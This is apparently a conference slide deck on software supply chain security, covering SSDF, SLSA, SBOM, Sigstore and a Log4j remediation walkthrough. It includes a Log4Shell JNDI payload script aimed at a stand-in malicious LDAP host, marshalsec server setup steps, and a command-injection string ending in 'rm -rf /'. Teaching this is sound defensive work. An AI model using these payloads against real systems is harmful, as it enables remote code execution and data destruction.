---
marp: true
theme: default
header: "OSS - Software Supply Chain Security"
footer: "JBoss User Group Korea"
paginate: true
backgroundColor: #ffff
---


# Software Supply Chain Security

## What, Why and how

Bruno Georges

![bg right 33%](./assets/Logo-Red_Hat-A-Standard-RGB.svg)

---

## Agenda

- What is Software Supply Chain Security
  - Let’s review together what it means and why does it matter
  - History and Facts.
  - Vulnerability exploit examples
- Going Deeper
  - Identify Supply Chain Attack Vectors
  - How can we secure this end to end
  - Standards, Frameworks, Tools: SSDF, SLSA, SBOM, Sigstore
- Putting this together
- Takeaways and recommendations
- Q&A

---

## Back in the Web 1.0 days

### Perl CGI Example


```perl
#!/usr/bin/perl
print "Content-type: text/html\n\n";
print "<html><body>Hello, World!</body></html>";
```

### C CGI Example

```c
#include <stdio.h>

int main() {
    printf("Content-Type: text/html\n\n");
    printf("<html><body>Hello, World!</body></html>");
    return 0;
}
```
---

## Supply Chain 1.0

![img bottom 80%](./assets/supply-chain-1_0.png)

---

## Introduction of Dependencies

### Late 1990s - Early 2000s

- Use of libraries like `cgi-bin`, `Mail::Form` in Perl
- Increased functionality, but also new vulnerabilities

### Perl with Dependencies

```perl
use CGI;
my $q = CGI->new;
print $q->header, $q->start_html('Hello World');
print $q->h1('Hello, World!');
print $q->end_html;
```

---

## What could go wrong?

- Introduction of CVEs (Common Vulnerabilities and Exposures) and exploits

### Examples
``` 
http://{url}/cgi-bin/FormMail.pl?recipient=spam@malicious.com&subject=Urgent=GotYou!
```

```bash
perl script.pl 'http://www.yourcompany.com; rm -rf /'
```

### Mitigation

- For FormMail: Validate and sanitize all inputs, particularly email addresses.
- For cgic: Use functions with bounds checking, such as ```strncpy```, and perform proper input validation


---
 ## Things needed to change

- Security Awareness and Education
- Code Reviews and Audits ( starting with peer programming / reviews) 
- Static Analysis Tools ( tools like ```lint``` ) 
- Following mailing lists & advisories such as CERT 
- Environment Hardening & Patch Management
- Security Testing and Penetration Testing (tools like ```satan``` ) 
- Secure Development Lifecycle (SDL)
- Process Integration: Incorporating security into every phase of the software development lifecycle, from design to deployment.
- Defining security requirements alongside functional requirements.

---

## The Birth of Secure Software Development Lifecycle (SDLC)

- Early 2000s: Organizations start adopting SDLC best practices
- Focus on identifying and mitigating vulnerabilities early in the development process

---

## Modern Frameworks: SSDF and SLSA

### SSDF (Secure Software Development Framework)

- Framework for integrating security practices into software development

### SLSA (Supply Chain Levels for Software Artifacts)

- Framework for ensuring the integrity of software artifacts

### Components

- **SBOM** (Software Bill of Materials)
- **Sigstore** for signing and verifying software

---

![bg 70%](./assets/supply-chain-threats.png)

---


## Why do we care?

[NASA’s Boeing Starliner Crew Flight Test Launch – June 5, 2024 (Official NASA Broadcast)](https://www.youtube.com/watch?v=HneVxAmYcaA) 
![bg right 90%](./assets/rht-openjdk-nasa.jpg)

---
## Consumers being consumed

- OpenJDK Temurin
- Quarkus example

---

## Shifting Left
### Red Hat play a leadship and key role upstream

- Red Hat [joined](https://www.redhat.com/en/blog/red-hat-joins-eclipse-adoptium-working-group) Eclipse Adptium WG in 2021. The OpenJDK code, build, tests and binaires have now a new home upstream.
- The Adoptium [security audit report](https://ostif.org/wp-content/uploads/2024/06/Temurin-Final-Report.pdf) and [response document](https://adoptium.net/pdf/temurin-audit-response.pdf) were published last month. :rocket:
- With the European Union’s Cyber Resilience Act (CRA) and for all this to work, we need to establish a common specifications for secure software development based on open source best practices. [Bring OSS foundation together and have a single voice](https://blogs.eclipse.org/post/mike-milinkovich/open-source-community-building-cybersecurity-processes-cra-compliance)
- Collaboration on the [Adoptium Temurin build's Supply Chain Security](https://outreach.eclipse.foundation/adoptium-temurin-supply-chain-security)

---

## Eclipse Adoptium Download Trends

(https://dash.adoptium.net/trends)

![bg right 100%](./assets/adoptium-trends.png)

---

## Quarkus - Example

- Supersonic Subatomic Java  :rocket:
- Designed for Kubernetes and optimized for GraalVM and OpenJDK HotSpot

---

## Building with External Dependencies

1. Managing dependencies
2. Ensuring the integrity of dependencies
3. Using trusted sources and repositories

---

## Generating SBOM Artifact

- Tools and practices for generating SBOMs
- Example: Using CycloneDX to generate an SBOM

---

## Signing with Sigstore

- Benefits of signing artifacts
- Example: Signing Quarkus artifacts with Sigstore

---

## Examples: Identifying and Remediating Vulnerabilities

### Java Example: Log4j CVE

#### Identifying CVE in Log4j

1. **Create a Sample Java Project with a Vulnerable Log4j Dependency**

```bash
mkdir log4j-example
cd log4j-example
mvn archetype:generate -DgroupId=com.example -DartifactId=log4j-example -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false
cd log4j-example
```
---

2. **Add the Vulnerable Log4j Dependency to `pom.xml`:**

```xml
<dependencies>
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.14.1</version> <!-- Vulnerable version -->
    </dependency>
</dependencies>
```
---

3. **Create a Sample Java File:**

```java
package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class App {
    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main(String[] args) {
        logger.info("Hello, World!");
    }
}
```
---

4. **Compile and Run the Project:**

```bash
mvn package
java -cp target/log4j-example-1.0-SNAPSHOT.jar com.example.App
```

---

## Using SBOM to Identify the CVE

1. **Generate SBOM** Add the CycloneDX Maven plugin to your `pom.xml`:

```xml
<build>
    <plugins>
        <plugin>
            <groupId>org.cyclonedx</groupId>
            <artifactId>cyclonedx-maven-plugin</artifactId>
            <version>2.7.4</version>
            <executions>
                <execution>
                    <goals>
                        <goal>makeAggregateBom</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>
```

---

2. **Generate the SBOM:**

```bash
mvn cyclonedx:makeAggregateBom
```

3. **Analyze the SBOM:**

The SBOM will be generated in `target/bom.xml`. You can use tools like Dependency-Track or CycloneDX CLI to analyze the SBOM and identify CVEs.

```bash
cycloneDXBomUtility analyze -i target/bom.xml
```

---

### Exploiting the Log4j Vulnerability

#### Python Script to Exploit Log4j CVE-2021-44228

```python
import requests

# Target URL
url = "http://localhost:8080"  # Adjust to the target's actual address

# Malicious payload
payload = '${jndi:ldap://malicious-server.com/a}'

# Sending the payload
headers = {
    'User-Agent': payload
}

response = requests.get(url, headers=headers)
print("Exploit sent, check your LDAP server for interactions.")
```

---

#### Running the Exploit

1. **Set Up a Malicious LDAP Server:**

You can use a tool like `marshalsec` to set up a malicious LDAP server that serves the payload.

```bash
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://your-malicious-server.com/#Exploit"
```

2. **Run the Exploit Script:**

```bash
python exploit_log4j.py
```

---

### Remediation

To remediate the Log4j vulnerability, update to a non-vulnerable version (e.g., 2.17.0).

1. **Update `pom.xml`:**

```
<dependencies>
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.17.0</version> <!-- Safe version -->
    </dependency>
</dependencies>
```

2. **Rebuild and Redeploy the Project:**

```bash
mvn clean package
java -cp target/log4j-example-1.0-SNAPSHOT.jar com.example.App
```

---

## Conclusion

- Importance of secure software supply chains
- Adopting frameworks like SSDF and SLSA
- Utilizing tools like SBOM and Sigstore for a secure foundation

---

# Thank You

- Questions and Discussion

---

# References & Credits

- SLSA Supply Chain Threats Overview: SLSA Spec
- 

